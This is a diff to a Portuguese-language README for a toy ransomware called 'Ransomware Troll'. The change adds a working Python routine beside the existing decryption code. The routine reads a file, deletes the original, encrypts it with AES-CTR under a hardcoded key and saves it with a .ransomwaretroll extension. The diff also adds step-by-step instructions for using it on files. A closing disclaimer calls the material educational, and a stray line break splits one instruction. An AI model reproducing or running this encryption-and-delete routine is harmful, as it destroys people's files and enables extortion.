@@ -1,16 +1,16 @@
 # Documentação do Ransomware Troll
 
-Esta documentação fornece informações sobre o Ransomware Troll, um programa de criptografia de arquivos malicioso, e mostra como descriptografar arquivos que foram afetados por ele. Este documento inclui uma descrição do código base necessário para descriptografar os arquivos criptografados pelo Ransomware Troll.
+Esta documentação fornece informações sobre o Ransomware Troll, um programa de criptografia de arquivos malicioso, e mostra como descriptografar arquivos que foram afetados por ele. Este documento inclui uma descrição dos códigos base necessários para descriptografar e criptografar arquivos afetados pelo Ransomware Troll.
 
 ## Descrição
 
-O Ransomware Troll é um tipo de malware que criptografa arquivos presentes em um sistema e exige um resgate para fornecer a chave de descriptografia. O código apresentado aqui é uma solução para descriptografar arquivos afetados pelo Ransomware Troll, usando a biblioteca `pyaes` para realizar a descriptografia.
+O Ransomware Troll é um tipo de malware que criptografa arquivos presentes em um sistema e exige um resgate para fornecer a chave de descriptografia. Os códigos apresentados aqui são soluções para descriptografar arquivos afetados pelo Ransomware Troll e também para criptografar arquivos usando o mesmo método de criptografia.
 
 ## Pré-requisitos
 
-Antes de executar o código de descriptografia, é necessário ter o Python instalado em seu sistema. Além disso, você deve ter a biblioteca `pyaes` instalada. Você pode instalá-la usando o comando `pip install pyaes`.
+Antes de executar os códigos de descriptografia e criptografia, é necessário ter o Python instalado em seu sistema. Além disso, você deve ter a biblioteca `pyaes` instalada. Você pode instalá-la usando o comando `pip install pyaes`.
 
-## Código Base
+## Código de Descriptografia
 
 Aqui está o código base que pode ser usado para descriptografar arquivos criptografados pelo Ransomware Troll:
 
@@ -41,15 +41,45 @@ new_file.close()
 
 Certifique-se de substituir `"arquivo.txt.ransomwaretroll"` pelo nome do arquivo criptografado real que você deseja descriptografar e `"testeransomwares"` pela chave correta de descriptografia fornecida pelo atacante.
 
+## Código de Criptografia
+
+Aqui está o código base que pode ser usado para criptografar arquivos usando o Ransomware Troll:
+
+```python
+import os
+import pyaes
+
+file_name = "arquivo.txt"
+file = open(file_name, "rb")
+file_data = file.read()
+file.close()
+
+os.remove(file_name)
+
+key = b"testeransomwares"
+aes = pyaes.AESModeOfOperationCTR(key)
+
+crypto_data = aes.encrypt(file_data)
+
+new_file = file_name + ".ransomwaretroll"
+new_file = open(f'{new_file}', 'wb')
+new_file.write(crypto_data)
+new_file.close()
+```
+
+Certifique-se de substituir `"arquivo.txt"` pelo nome do arquivo que você deseja criptografar e `"testeransomwares"` pela chave correta de criptografia. O código criptografará o arquivo selecionado e salvará uma versão criptografada com a extensão `.ransomwaretroll`.
+
 ## Instruções
 
 Para descriptografar um arquivo afetado pelo Ransomware Troll, siga estas etapas:
 
-1. Certifique-se de ter instalado o Python em seu sistema.
+1. Cert
+
+ifique-se de ter instalado o Python em seu sistema.
 
 2. Instale a biblioteca `pyaes` usando o comando `pip install pyaes`.
 
-3. Copie o código base fornecido acima e cole-o em um novo arquivo Python.
+3. Copie o código de descriptografia fornecido acima e cole-o em um novo arquivo Python.
 
 4. Abra o arquivo Python em um editor de texto e modifique a linha `file_name = "arquivo.txt.ransomwaretroll"` para corresponder ao nome do arquivo criptografado que você deseja descriptografar.
 
@@ -65,6 +95,6 @@ Para descriptografar um arquivo afetado pelo Ransomware Troll, siga estas etapas
 
 10. Verifique se o arquivo descriptografado foi criado corretamente.
 
-**Nota:** É importante ressaltar que esta solução foi fornecida apenas para fins educacionais
+Para criptografar um arquivo usando o Ransomware Troll, siga as mesmas etapas de 1 a 7 acima, mas substitua o código de descriptografia pelo código de criptografia fornecido. Certifique-se de fornecer o nome do arquivo que você deseja criptografar e a chave correta de criptografia. O arquivo criptografado será salvo com a extensão `.ransomwaretroll`.
 
- e de pesquisa, e não é incentivado o uso de ransomware ou atividades ilegais. A descriptografia de arquivos criptografados por ransomware só é possível se você tiver acesso à chave correta de descriptografia. Recomenda-se que você procure assistência de profissionais de segurança cibernética ao lidar com ataques de ransomware.
+**Nota:** É importante ressaltar que esta solução foi fornecida apenas para fins educacionais e de pesquisa, e não é incentivado o uso de ransomware ou atividades ilegais. A descriptografia de arquivos criptografados por ransomware só é possível se você tiver acesso à chave correta de descriptografia. Recomenda-se que você procure assistência de profissionais de segurança cibernética ao lidar com ataques de ransomware.
